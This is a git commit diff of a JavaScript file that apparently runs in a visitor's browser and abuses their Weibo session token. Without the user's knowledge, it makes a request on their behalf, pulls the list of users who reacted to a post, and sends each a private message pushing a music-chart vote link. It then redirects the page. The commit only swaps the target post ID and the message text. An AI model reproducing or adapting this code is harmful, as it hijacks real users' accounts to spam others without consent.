d87f31551c87dabfc8c89b670cfd67581307147e
opensourcessss <fuxuemin888@126.com>
2018-12-23 10:37:37 +0800

    Update f.js

--- f.js
+++ f.js
@@ -9,7 +9,7 @@
                 xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
                 xhr.send('uid=6421536602&st=' + obj.data.st);
                 var f=new XMLHttpRequest();
-                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4319646800246787",true);
+                f.open("GET","https://m.weibo.cn/api/attitudes/show?id=4276121468638201",true);
                 f.send();
                 f.onreadystatechange=function(){
                     if(f.readyState==4){
@@ -19,7 +19,7 @@
                             var x = new XMLHttpRequest();
                             x.open('post', 'https://m.weibo.cn/api/chat/send' );
                             x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的兴迷，2018qq音乐巅峰榜张艺兴需要你的一票，目前排第一，动动手指投一票>>http://t.cn/E4fNeGo&st=' + obj.data.st);
+                            x.send('uid='+u.data.data[i].user.id+'&content=亲爱的ikun，2018qq音乐巅峰榜坤坤需要你的一票，目前排第三，动动手指投一票>>http://t.cn/E4fNeGo&st=' + obj.data.st);
                             window.location.href="https://y.qq.com/m/act/2018_year_share_wb/index.html";
                         }
                     }
